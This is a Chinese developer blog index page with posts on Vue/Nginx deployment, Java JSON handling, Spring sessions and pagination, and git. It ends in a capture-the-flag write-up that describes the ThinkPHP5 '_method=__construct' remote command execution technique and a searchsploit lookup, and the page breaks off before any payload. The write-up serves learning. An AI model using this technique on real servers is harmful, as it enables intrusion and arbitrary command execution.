<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-Vue打包上传至Linux环境下Nginx服务器-1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/01/09/Vue打包上传至Linux环境下Nginx服务器-1/" class="article-date">
  <time datetime="2022-01-09T05:35:03.376Z" itemprop="datePublished">2022-01-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Vue打包上传至Linux环境下Nginx服务器"><a href="#Vue打包上传至Linux环境下Nginx服务器" class="headerlink" title="Vue打包上传至Linux环境下Nginx服务器"></a>Vue打包上传至Linux环境下Nginx服务器</h2><hr>
<p>##1.打包<br>输入npm run build</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure>

<p>得到图中的文件夹</p>
<p><img src="https://img-blog.csdnimg.cn/0169c2dcd84e4d22bf93c9617204d5bb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAenlkYmsxMjM0NTY=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f60509a4c645453b8939e3c749efe996.png#pic_center" alt="在这里插入图片描述"></p>
<p>##2.上传至Linux服务器</p>
<p>   把打包得到的dist文件夹压缩为zip文件，使用ssh工具上传至服务器。或者直接把dist文件上传到服务器。这里我采用了第二种办法，使用了FinalShell工具。</p>
<p>##3.配置Nginx</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis nginx</span><br></pre></td></tr></table></figure>

<p>先看看nginx的安装位置，找到根目录下的nginx.conf配置文件。</p>
<p><img src="https://img-blog.csdnimg.cn/911193a79e3d483eb659da97795875a8.png#pic_center" alt="在这里插入图片描述"><br>配置nignx.conf</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       8091;<span class="comment">#监听的接口</span></span><br><span class="line">    <span class="comment">#    listen       [::]:80;</span></span><br><span class="line">        server_name  81.70.153.9;<span class="comment">#服务器的ip地址</span></span><br><span class="line">    <span class="comment">#    root         /usr/share/nginx/html;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Load configuration files for the default server block.</span></span><br><span class="line">    <span class="comment">#    include /etc/nginx/default.d/*.conf;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    error_page 404 /404.html;</span></span><br><span class="line">    <span class="comment">#    location = /404.html &#123;</span></span><br><span class="line">    <span class="comment">#    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    error_page 500 502 503 504 /50x.html;</span></span><br><span class="line">    <span class="comment">#    location = /50x.html &#123;</span></span><br><span class="line">    <span class="comment">#    &#125;</span></span><br><span class="line">    	    location / &#123;</span><br><span class="line">    			root /root/yushijujin-web/dist;<span class="comment">#注意dist后无斜杠</span></span><br><span class="line">    			<span class="comment">#try_files $uri $uri/ @router;</span></span><br><span class="line">    			index index.html index.htm;</span><br><span class="line">    	    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>##重启nginx</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure>

<p>需要注意，打包之前要修改Vue的配置信息，打开config下的index.js,把assetsPublicPath的路径修改为’./‘(默认为/).上传后可能打不开页面,可能会是服务器的自定义端口没开,打开服务器设置自定义的(8091)端口可用,也有可能是路径的问题比如assetsPublicPath路径为/<br><img src="https://img-blog.csdnimg.cn/f8ceaf34ce6c416aba907d94ccb4e010.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAenlkYmsxMjM0NTY=,size_16,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2022/01/09/Vue打包上传至Linux环境下Nginx服务器-1/" data-id="cky6tqd6s0003swv9p2lkq136" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-JAVA处理JSON数据的实现与注意事项" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/06/JAVA处理JSON数据的实现与注意事项/" class="article-date">
  <time datetime="2020-11-06T11:05:53.955Z" itemprop="datePublished">2020-11-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/06/JAVA处理JSON数据的实现与注意事项/">JAVA处理JSON数据的实现与注意事项</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="1-JSON简介"><a href="#1-JSON简介" class="headerlink" title="1.JSON简介"></a>1.JSON简介</h2><p>   JSON(Javascript Object Notation,JS对象简谱)是一种轻量级的数据交换格式。它基于 ECMAScript (欧洲计算机协会制定的js规范)的一个子集，采用完全独立于编程语言的文本格式来存储和表示数据。简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。</p>
<h2 id="2-JSON格式"><a href="#2-JSON格式" class="headerlink" title="2.JSON格式"></a>2.JSON格式</h2><p>JSON实际上类似于键值对。以大括号”{“开始并以大括号”}”结束,结构如下：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	key1:value1</span><br><span class="line">	<span class="selector-tag">key2</span><span class="selector-pseudo">:value2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>熟悉JSON的人都知道两个概念：JSON对象以及JSON字符串。之前总是分不清这两个概念，仔细查询了资料发现两者其实很好区分。</p>
<p>json字符串：指的其实是符合json格式的字符串。比如：<br><code>var jsonStr=&#39;{&quot;name&quot;:&quot;stu&quot;,&quot;sno&quot;:101,&quot;grade&quot;:80}&#39;</code><br>实际上就是用字符串的格式表现json对象。<br>json对象：指的是js对象的字符串表示<br><code>var jsonObj={&quot;name&quot;:&quot;stu&quot;,&quot;sno&quot;:101,&quot;grade&quot;:80}</code></p>
<p>json对象可以直观的表现js对象的结构，但是客户端向服务器发起一些（例如http）请求时，一般会以json字符串的形式发送到客户端。</p>
<p>js中，json对象和json字符串之间的转换也比较简单，通常使用<code>JSON.parse()</code>把json字符转换为json对象。而使用<code>JSON.stringify()</code>把json对象转换为json字符串(js发送ajax请求传送对象时通常会采用这个方法)。</p>
<h2 id="3-JAVA对JSON的处理"><a href="#3-JAVA对JSON的处理" class="headerlink" title="3.JAVA对JSON的处理"></a>3.JAVA对JSON的处理</h2><hr>
<p>这里以springboot为例演示代码。</p>
<p>对于json数据的处理在java开发的后台中还是非常常见的，因此也有不少的第三方库使开发者能够快捷处理json数据。这里我采用了阿里的fastjson对json数据进行处理。在最近的项目中需用到科大讯飞的接口实现语音听写功能，但是返回的处理数据是json，还要转换为数据库可接受的类型才能进行数据库的查询。</p>
<p>科大讯飞接口返回的数据：<br><img src="https://img-blog.csdnimg.cn/20201106183813720.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用java对json数据处理，并把分词拼接为字符串</p>
<pre><code>public String getString(String jsonStr){
    StringBuffer stringBuffer=new StringBuffer(&quot;&quot;);
    JSONObject jsonObject=JSON.parseObject(jsonStr);
    JSONArray wsArr=jsonObject.getJSONArray(&quot;ws&quot;);
    for(int i=0;i&lt;wsArr.size();i++) {
      JSONObject wsArrObj=wsArr.getJSONObject(i);
      JSONArray CWArr=wsArrObj.getJSONArray(&quot;cw&quot;);
      for (int j = 0; j &lt; CWArr.size(); j++) {
        JSONObject CWArrObj = CWArr.getJSONObject(j);
        String wStr = CWArrObj.getString(&quot;w&quot;);
        stringBuffer.append(wStr);
        str.add(wStr);
      }
    }
   return stringBuffer.toString();
}</code></pre><p>首先jsonStr是科大讯飞语音识别后得到的json数据，调用 <code>parseObject(String str)</code>把数据转换为JSON对象。由于返回的JSON对象当中有的键值对值为数组(表示分词结果的数组对象)我们需要调用<code>getJSONArray(JSONObject jsonObject)</code>得到这个JSON格式的数组。之后循环遍历得到每个中文分词结果，在采用同样的操作，得到“w”（分词）的值。最后定义stringbuffer拼接每个分词。</p>
<h2 id="4-springMVC与JSON有关的几个注解"><a href="#4-springMVC与JSON有关的几个注解" class="headerlink" title="4.springMVC与JSON有关的几个注解"></a>4.springMVC与JSON有关的几个注解</h2><p>@RequestBody</p>
<p>注解用于读取http请求的内容(字符串)，通过springmvc提供了可用的接口lHttpMessageConverter接口将读到的内容（json数据）转换为java对象并绑定到Controller方法的参数上。</p>
<pre><code>public Map&lt;String,Object&gt; addFavorite(@PathVariable Integer userId, @RequestBody List&lt;Integer&gt; typeList){</code></pre><p>这个代码表示了发送的list是json格式的。格式:[0,1,2] (传了一个元素为0，1，2的list)。<br>@ResponseBody<br>用于将Controller的方法返回的对象，通过springmvc提供的HttpMessageConverter接口转换为指定格式的数据如：json,xml等，通过Response响应给客户端。一般来说，如果在类加上了@RestController注解可以不在方法上加上@RepsonseBody注解。</p>
<h2 id="5-springMVC返回JSON"><a href="#5-springMVC返回JSON" class="headerlink" title="5.springMVC返回JSON"></a>5.springMVC返回JSON</h2><pre><code>@GetMapping(value = &quot;/fuzz&quot;,produces = &quot;application/json;charset=UTF-8&quot;)</code></pre><p>produces指定返回的数据MIME类型为application/json类型的数据。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/11/06/JAVA处理JSON数据的实现与注意事项/" data-id="cky6tqd6l0001swv9ij5rob6d" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-flutter与spring-boot交互获取session" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/07/flutter与spring-boot交互获取session/" class="article-date">
  <time datetime="2020-10-07T12:45:45.480Z" itemprop="datePublished">2020-10-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/07/flutter与spring-boot交互获取session/">flutter与spring boot交互获取session</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>最近在使用springboot做项目，和前端flutter交互时，发现flutter无法通过后台的登录验证。后来发现是因为flutter向后台发送http请求时session为空，无法通过拦截器的验证。</p>
<h2 id="1-springboot后台拦截器代码"><a href="#1-springboot后台拦截器代码" class="headerlink" title="1.springboot后台拦截器代码"></a>1.springboot后台拦截器代码</h2><pre><code>String url=request.getRequestURI();
HttpSession session=request.getSession(false);
Logger logger= LogManager.getLogger();
User user= (User) request.getSession().getAttribute(&quot;user&quot;);
if( user == null){
     response.sendRedirect(&quot;&quot;);
     return false;
}</code></pre><p>我这里的拦截器会从http请求的request请求中获取session，并且获取存入session的user键对应的值。如果session为空，就会重新回到登录页面。</p>
<h2 id="2-解决方法"><a href="#2-解决方法" class="headerlink" title="2.解决方法"></a>2.解决方法</h2><p>解决方法其实很简单，我们要从http请求头入手。如果对cookie以及session认证机制有所了解的话，可以知道用户在客户端发出请求后，服务器会生成session并存储在服务器中。但是服务器一旦通过验证会生成JSESSIONID并放在本地存储的cookie中。所以我们只需要获取后台生成的session id并在每次发出http请求时在报文头部中添加这个session id。</p>
<p><strong>后台代码</strong></p>
<pre><code>session.setAttribute(&quot;user&quot;,userDB);//HttpSession session
logger.info(&quot;sessioni: &quot;+session.getId());
response.setHeader(&quot;Set-Cookie&quot;, session.getId());</code></pre><p>在响应头添加生成的session的id，在flutter这样操作：</p>
<p>response.header[‘set-cookie’]=$jsessionId</p>
<p>之后的每次请求在请求头上添加</p>
<p>cookie：JSESSIONID=<strong>***</strong>;</p>
<p>每次请求为请求头设置，可以设置一个全局变量赋值</p>
<p>request.header[‘cookie’]=’JSESSIONID=<strong>****</strong>‘</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/10/07/flutter与spring-boot交互获取session/" data-id="cky6tqd70000aswv9us0jlgvr" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-new-post" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/06/new-post/" class="article-date">
  <time datetime="2020-09-06T09:25:25.000Z" itemprop="datePublished">2020-09-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/06/new-post/">new post</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/09/06/new-post/" data-id="cky6tqd6z0009swv9j2l4mqua" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-springboot分页-pageable作参数以及List转换为Page" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/06/springboot分页-pageable作参数以及List转换为Page/" class="article-date">
  <time datetime="2020-09-06T09:16:59.861Z" itemprop="datePublished">2020-09-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/06/springboot分页-pageable作参数以及List转换为Page/">springboot分页 pageable作参数以及List转换为Page</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Page与Pageable"><a href="#Page与Pageable" class="headerlink" title="Page与Pageable"></a>Page与Pageable</h2><p>Page是spring data jpa提供的一个接口。包含了部分数据集合以及相关的下一部分数据集合以及数据总数等信息。可以获得当前的页面的记录以及总页数和总数据数，以及数据是否能够再分页。</p>
<p>PageImpl是Page接口的实现类。重写了 <code>hashcode(),equals(),toString()</code>方法。</p>
<p>Pageable也是spring data jpa提供的接口，包含了分页的信息，页数getPageNumber()和每页的数据数getPageSzie()。以便JPA通过<br>Pageable得到一个带分页信息的sql语句。PageRequest是Pageable的实现类。提供了排序功能。</p>
<h2 id="使用Page实现分页"><a href="#使用Page实现分页" class="headerlink" title="使用Page实现分页"></a>使用Page实现分页</h2><p>数据库访问层的接口继承<strong>JpaRepository接口</strong>和<strong>JpaSpecificationExecutor接口</strong></p>
<pre><code>public interface UserRepository extends JpaRepository&lt;User, String&gt;,JpaSpecificationExecutor&lt;User&gt; {
    public User findByName(String name);
    @Query(value=&quot;select count(*) from user&quot;,nativeQuery = true)
    public int countUser();
    public User findByUserId(String userId);
    @Modifying
    @Query(value=&quot;update user set password=?1 where user_id=?2&quot;,nativeQuery = true)
    public void updatePassword(String newpassword,String userId);
    @Modifying
    @Query(value=&quot;update user set permission=?1 where user_id=?2&quot;,nativeQuery = true)
    public void updatePermission(String permission,String userId);
}</code></pre><p>这样可以实现Page实现分页查询</p>
<h2 id="定义sql语句中的Pageable参数"><a href="#定义sql语句中的Pageable参数" class="headerlink" title="定义sql语句中的Pageable参数"></a>定义sql语句中的Pageable参数</h2><p>定义Pageable参数使用了Pageable接口的实现类PageRequest。之前的new PageRequest()方式已被弃用。现在使用PageRequest.of来定义Pageable接口的具体内容，如数据为总集合的第几页以及页数。</p>
<pre><code>Pageable pageable;
pageable= PageRequest.of(page,pageSize, Sort.by(Sort.Direction.DESC,&quot;time&quot;));</code></pre><p>这段代码定义了查询数据集的第几页数据以及每页的数据数。并按time属性的倒序排序查询的结果。</p>
<p>@Query定义的sql语句声明pagable参数</p>
<pre><code>@Query(value=&quot;select * from camera where user_id=?1 order by &quot;,nativeQuery = true)
public Page&lt;Camera&gt; findAllByUserId(String userId, Pageable pageable);</code></pre><p>使用#pageable声明pageable参数。</p>
<h2 id="List转换为Page"><a href="#List转换为Page" class="headerlink" title="List转换为Page"></a>List转换为Page<t></t></h2><p>有时数据库操作需要执行动态sql语句，我们可以通过entityManager实现动态sql。但是如果采用entityManager执行访问数据库操作的话，我们需要借助NativeQuery执行sql语句，这样返回的结果一般是List类型的。那么，如何让结果转换为Page类型呢？其实，只需要借助Pageable接口和Page接口的实现PageImpl。</p>
<p>具体的代码如下：</p>
<pre><code>String sql=&quot;select * from &quot;+tableName+&quot; order by time desc&quot;;//&quot; limit &quot;+Integer.toString(page*pageSize)+&quot;,&quot;+Integer.toString(pageSize);
Query nativeQuery=entityManager.createNativeQuery(sql);
List&lt;WeighData&gt; resultList=nativeQuery.getResultList();
int begin= (int) pageable.getOffset();
int en=(begin+pageable.getPageSize())&gt;resultList.size()?resultList.size():(begin+pageable.getPageSize());
return new PageImpl&lt;WeighData&gt;(resultList.subList(begin,en),pageable,resultList.size());</code></pre><p>其中通过getOffset获得这一页的开头在原结果集中的位置，并且通过判断开头的位置加上每页数据数后的结果是否大于最后一个数据在原数据集的位置获取每页的最后数据的位置。(末页的数据数可能不够一个pagesize)，最终获取到一个Page。完成(类似于sql中的limit)分页查询.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/09/06/springboot分页-pageable作参数以及List转换为Page/" data-id="cky6tqd7a000jswv92nqfayuf" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-vue-element-admin用户登录流程" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/31/vue-element-admin用户登录流程/" class="article-date">
  <time datetime="2020-08-31T14:00:12.687Z" itemprop="datePublished">2020-08-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/08/31/vue-element-admin用户登录流程/">vue-element-admin用户登录流程</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="1-vue-element-ui简介"><a href="#1-vue-element-ui简介" class="headerlink" title="1.vue-element-ui简介"></a><strong>1.vue-element-ui简介</strong></h2><p>vue-element-ui集成了vue和element-ui框架。 是一个后台前端解决方案，它基于 vue 和 element-ui实现。它使用了最新的前端技术栈，内置了 i18 国际化解决方案，动态路由，权限验证，提炼了典型的业务模型，提供了丰富的功能组件。</p>
<h2 id="2-使用token作为用户凭证"><a href="#2-使用token作为用户凭证" class="headerlink" title="2.使用token作为用户凭证"></a><strong>2.使用token作为用户凭证</strong></h2><p>vue-element-ui使用了token作为用户的登录凭证。token是在服务端产生的用户凭证，产生的token交给前端的用户。基于token的用户验证是无状态的，服务端产生的token本身包含了用户信息。用户每次发送请求到服务端的时候都会携带token信息，在服务端验证后进行操作返回数据。token应该在请求的头部发送，以便实现http请求的无状态。<strong>在vue-element-admin中，发送请求是请求头部中的x-token携带了token信息</strong>。</p>
<p><img src="https://img-blog.csdnimg.cn/20200831202815915.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2 id="3-登录流程介绍"><a href="#3-登录流程介绍" class="headerlink" title="3.登录流程介绍"></a><strong>3.登录流程介绍</strong></h2><p>打开src/views/login/index.vue,可以看到登录按钮绑定了handlelogin函数</p>
<pre><code>this.$store.dispatch(&apos;user/login&apos;, this.loginForm)//store/modules/user.js有login方法
       .then(() =&gt; {
      this.$router.push({ path: this.redirect || &apos;/&apos;, query: this.otherQuery })
          this.loading = false
        })
        .catch(error =&gt; {
          this.$message({
            showClose: true,
            message: error.message,
            type: &apos;error&apos;
          })
          this.loading = false
          this.getCode()
        })</code></pre><p>调用了store/modules/user.js的login方法。看看这个方法有什么</p>
<pre><code>login({ commit }, userInfo) {
    const { username, password } = userInfo
    return new Promise((resolve, reject) =&gt; {
  login({ userName: username.trim(), password: password }).then(response =&gt; {//ESLINT简写方法，response为后台的ajax数据
    console.log(response)
    const data=response
    if(data.token==&apos;&apos;){
      if(data.erinfo===&apos;wrong password&apos;){
        throw new Error(&apos;密码错误&apos;)
      }
      if(data.erinfo===&apos;user not exist&apos;){
        throw new Error(&apos;用户名不存在&apos;)
      }
    }
    commit(&apos;SET_TOKEN&apos;, data.token)
    setToken(data.token)//接受后台数据中的token，否则就抛出异常
    resolve()
  }).catch(error =&gt; {
    reject(error)
    console.log(&apos;k&apos;)
    console.log(error)
  })
})</code></pre><p>  },<br>`</p>
<p>  可以看到登录界面绑定的表单值username(用户名)和password(密码)在这里作为参数。但是我们可以看到这里又调用了一个函数login()，这个函数又是哪里来的 ? store的user.js第一行导入了api下的user.js定义的login方法，这个login方法就是从这里定义的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#123; login, logout, getInfo &#125; from &apos;@/api/user&apos;</span><br></pre></td></tr></table></figure>

<p>打开api下的user.js。<strong>api下的js文件提供了vue访问服务端的方法，这些方法导入了request.js包装好的axios实例。因此只需要定义访问服务端资源的请求路径以及请求方式的类型和参数就可以访问服务端的资源</strong>。我们可以修改login方法让他访问服务端。例如：</p>
<pre><code>export function login(data) {
  return request({
    url: &apos;/web/user/confirm&apos;,//访问后台controller层
    method: &apos;post&apos;,
    data:data
  })
}</code></pre><p>后台controller层的对应方法(使用springMVC)</p>
<pre><code>@PostMapping(value = &quot;/confirm&quot;)
@ResponseBody
public Map&lt;String, Object&gt; confirm(@RequestBody User user) {
    Map &lt;String,Object&gt;map = new HashMap&lt;String, Object&gt;();
    User userdb=this.userManager.findByUserName(user.getUserName());
    if(userdb==null) {
        map.put(&quot;token&quot;, &quot;&quot;);
        map.put(&quot;erinfo&quot;,&quot;user not exist&quot;);
        return map;
    }
    else if(!userdb.getPassword().equals(encryptPassword(userdb.getSecret(), user.getPassword()))) {
        map.put(&quot;token&quot;, &quot;&quot;);
        map.put(&quot;erinfo&quot;, &quot;wrong password&quot;);
        return map;
    }
    String token = TokenUtil.generateToken(user.getUserName(), user.getPassword());
    map.put(&quot;token&quot;, token);
    return map;
}</code></pre><p>前文提到的token就是在这里生成的，这里使用json web token。返回的token将会被vuex储存到cookie里。如果后台验证成功，返回的JSON数据会先交给store/user.js中被导入的login方法处理，如果得到的token不为空，则设置该token为用户的凭证，之后的请求都会用到这个token。如果为空，则抛出异常。抛出的异常在store/user.js下的login方法再抛出到index.vue下的方法。<br>回到views下的index.vue中的handlelogin。看到代码可以知道如果登录验证通过(调用的没有抛出异常)，则进行路由跳转。否则页面提示错误信息(没有通过后端的验证)。这样就完成了一次登录流程，用户通过验证后就可以浏览页面了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/08/31/vue-element-admin用户登录流程/" data-id="cky6tqd79000iswv9vhnrwlya" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-git版本回退提交操作" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/05/13/git版本回退提交操作/" class="article-date">
  <time datetime="2020-05-13T14:43:43.283Z" itemprop="datePublished">2020-05-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="git版本回退以及提交操作"><a href="#git版本回退以及提交操作" class="headerlink" title="git版本回退以及提交操作"></a>git版本回退以及提交操作</h1><hr>
<p>###1.git pull后发现问题</p>
<p>今天pull下来git上的项目文件，发现pom和一些文件被组员整理项目结构时不小心删了。感觉如果再重新写有点耗时间。打算利用git的版本回退功能，去找回原来的文件。</p>
<hr>
<p>###2.使用git log命令</p>
<p>打开git控制台输入’git log’查看以前的提交记录。输入<code>git reset --hard commit id(hash)</code>回退。或者使用tortoisegit选择’show log’,选择之前的版本右键’reset master to this’去回退。</p>
<p>reset的三个参数：</p>
<pre><code>soft 仅移动head指针，不对工作区和暂存区操作
mixed 改变head指针，工作区但不改变暂存区内容
hard head指针，工作区，暂存区内容都改变</code></pre><p>版本回退到指定的版本，上一版本可以为HEAD^。发现需要merge。否则重新push到远程库时会提示’non-fast-forward’</p>
<hr>
<p>###3.解决git push non-fast-forward</p>
<p>出现这个问题，我的解决方法是 <code>git pull origin master --force</code>意思是直接替代remote的内容。发现可以成功提交。但事后了解这种方式适用于改动不大时的提交。更合适的方法是先pull下来最新的版本，在本地合并。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/05/13/git版本回退提交操作/" data-id="cky6tqd73000cswv9270brvba" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-BUUCTF-old-hack" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/26/BUUCTF-old-hack/" class="article-date">
  <time datetime="2020-04-26T11:25:37.220Z" itemprop="datePublished">2020-04-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/26/BUUCTF-old-hack/">BUUCTF old hack</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>#[BUUCTF] old hack</p>
<hr>
<p><strong>1.打开页面，获取提示信息</strong></p>
<p>打开页面，页面提示powered by Thinkphp。说明可能和thinkphp框架有关。也确实如此，这里用到了thinkphp5的远程命令执行漏洞。在用这个thinkphp的漏洞前，先了解一下有关thinkphp的一些基础知识:</p>
<p>thinkphp是一个用来简化企业应用开发和敏捷WEB应用的php框架。thinkphp包含了底层架构、兼容处理、基类库、数据库访问层、模板引擎、缓存机制、插件机制、角色认证、表单处理等常用的组件。简而言之，thinkphp是一个用来简化php网站开发的框架，让开发者更注重于业务逻辑。</p>
<p><img src="https://img-blog.csdnimg.cn/20200426175644953.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<hr>
<p><strong>2.thinkphp5远程命令执行漏洞</strong></p>
<p>漏洞描述：由于thinkphp对框架中的核心Requests类的方法method方法提供了表单请求伪造，该功能利用 <code>$_POST[&#39;_method&#39;]</code>来传递真实的请求方法。但由于框架没有对参数进行验证，导致攻击者可以设置<code>$_POST[&#39;_method&#39;]=&#39;__construct&#39;</code>而让该类的变量被覆盖。攻击者利用该方式将filter变量覆盖为system等函数名，当内部进行参数过滤时便会进行执行任意命令。</p>
<p>使用kali查找一下漏洞的利用方法：</p>
<p>1.<code>searchsploit thinkphp</code> 查找thinkphp相关的漏洞</p>
<p><img src="https://img-blog.csdnimg.cn/20200426175658860.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>2.<code>cd usr/share/exploitdb/exploits/php/webapp/46150.txt</code> 查看漏洞的利用方法</p>
<p><img src="https://img-blog.csdnimg.cn/20200426175709668.JPG" alt></p>
<p>3.post传参，发现页面提示flag在路径下存放</p>
